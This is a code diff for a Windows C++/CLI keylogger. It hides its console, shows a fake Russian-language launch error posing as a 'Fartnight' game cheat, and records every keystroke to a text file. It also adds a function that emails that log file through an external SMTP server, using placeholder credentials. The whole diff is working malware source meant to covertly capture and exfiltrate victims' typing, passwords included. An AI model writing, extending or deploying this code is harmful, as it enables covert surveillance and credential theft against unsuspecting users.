@@ -1,14 +1,44 @@
-﻿#include <iostream>
+// compile with: /clr  
+#include "pch.h"
+#include <iostream>
 #include <Windows.h>
 #include <fstream>
+#include <winreg.h>
+#using <System.dll>
+#pragma comment(lib, "user32.lib")
 
-using namespace std;
+using namespace System;
+using namespace System::Net;
+using namespace System::Net::Mail;
+using namespace System::Net::Mime;
+using namespace System::Threading;
+using namespace System::ComponentModel;
+using namespace Microsoft::Win32;
 
-int main()
+void sendmail()
+{
+	SmtpClient^ owo = gcnew SmtpClient("smtp.mail.ru", 25);
+	owo->Credentials = gcnew NetworkCredential("your_mail", "your_password");
+	owo->EnableSsl = true;
+	MailMessage^ mail = gcnew MailMessage();
+	mail->From = gcnew MailAddress("your_mail");
+	mail->To->Add(gcnew MailAddress("which_mail_you_want_to_send"));
+	mail->Subject = "Theme";
+	mail->Body = "uwu";
+	String^ rofl = L"rofl.txt";
+	Attachment^ uwu = gcnew Attachment(rofl, MediaTypeNames::Application::Octet);
+	mail->Attachments->Add(uwu);
+	owo->Send(mail);
+}
+
+void hidenerror()
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	ofstream txt("rofl.txt");
 	MessageBox(0, L"Ошибка при запуске приложения (0xc00007b). Для выхода из приложения нажмите кнопку ''ОК''", L"Fartnight_cheat.exe - Ошибка приложения", MB_OK | MB_ICONSTOP);//write here anything   you want(MB_ICONSTOP = error icon)
+}
+
+void keylog(std::ofstream &txt)
+{
 	while (true)
 	{
 		Sleep(1);
@@ -41,92 +71,89 @@ int main()
 					break;
 				case VK_CAPITAL:
 					txt << "<Caps_Lock>";
-					cout << "<Caps_Lock>" << endl;
 					break;
 				case VK_RETURN:
-					txt << endl << "<Enter>" << endl;
+					txt << std::endl << "<Enter>" << std::endl;
 					break;
 				case VK_SPACE:
-					txt << "< >" ;
+					txt << "< >";
 					break;
 				case VK_SNAPSHOT:
 					txt << "<PrtSc>";
-					cout << "<PrtSc>" << endl;
-					break; 
+					break;
 				case 0x21: //VK_PRIOR
 					txt << "<Page_Up>";
-					cout << "<Page_Up>" << endl;
 					break;
 				case VK_NEXT:
-					txt << "<Page_Down>"; 
+					txt << "<Page_Down>";
 					break;
 				case VK_TAB:
-					txt << "<Tab>"; 
-					cout << "<Tab>" << endl;
+					txt << "<Tab>";
 					break;
 				case VK_DELETE:
-					txt << "<Delete>"; 
-					cout << "<Delete>" << endl;
+					txt << "<Delete>";
 					break;
 				case VK_ESCAPE:
 					txt << "<Esc>";
-					cout << "<Esc>" << endl;
 					break;
 				case VK_F1:
 					txt << "<F1>";
-					cout << "<F1>" << endl;
 					break;
 				case VK_F2:
 					txt << "<F2>";
-					cout << "<F2>" << endl;
 					break;
 				case VK_F3:
 					txt << "<F3>";
-					cout << "<F3>" << endl;
 					break;
 				case VK_F4:
 					txt << "<F4>";
-					cout << "<F4>" << endl;
 					break;
 				case VK_F5:
 					txt << "<F5>";
-					cout << "<F5>" << endl;
 					break;
 				case VK_F6:
 					txt << "<F6>";
-					cout << "<F6>" << endl;
 					break;
 				case VK_F7:
 					txt << "<F7>";
-					cout << "<F7>" << endl;
 					break;
 				case VK_F8:
 					txt << "<F8>";
-					cout << "<F8>" << endl;
 					break;
 				case VK_F9:
 					txt << "<F9>";
-					cout << "<F9>" << endl;
 					break;
 				case VK_F10:
 					txt << "<F10>";
-					cout << "<F10>" << endl;
 					break;
 				case VK_F11:
 					txt << "<F11>";
-					cout << "<F11>" << endl;
 					break;
 				case VK_F12:
 					txt << "<F12>";
-					cout << "<F12>" << endl;
 					break;
-
 				default:
 					txt << char(button);
-					cout << char(button) << endl;
 					break;
-				}		
+				}
 			}
 		}
 	}
+}
+
+int main(array<System::String ^> ^args)
+{
+	HANDLE H = CreateMutex(NULL, true, L"kekw");
+	if (GetLastError() == ERROR_ALREADY_EXISTS)
+	{
+		return 0;
+	}
+
+	sendmail();
+
+	hidenerror();
+
+	std::ofstream txt("rofl.txt");
+
+	keylog(txt);
 }
